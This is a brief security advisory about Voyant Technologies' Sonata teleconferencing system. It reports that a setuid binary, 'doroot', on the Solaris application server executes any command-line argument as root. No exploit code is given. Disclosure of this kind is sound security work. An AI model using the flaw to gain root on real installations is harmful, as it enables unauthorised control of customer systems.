Description: Sonata is a teleconfrencing solution developed by Voyant
Technologies. This advisory concerns the Sonata application server and bridge
componet of the Sonata package. The application server is an Ultra Sparc 5
running Solaris 2.x as required by Voyant technologies. The bridge is an IBM PC
running OS/2 Warp. These hosts are usually built in house by Voyant personnel
and installed at customer locations by a field engineer.
Vulnerability:
The setuid binary doroot does exactly what it says. It executes its command
line argument as root. This is really silly and I dont know why it would need
to exist.
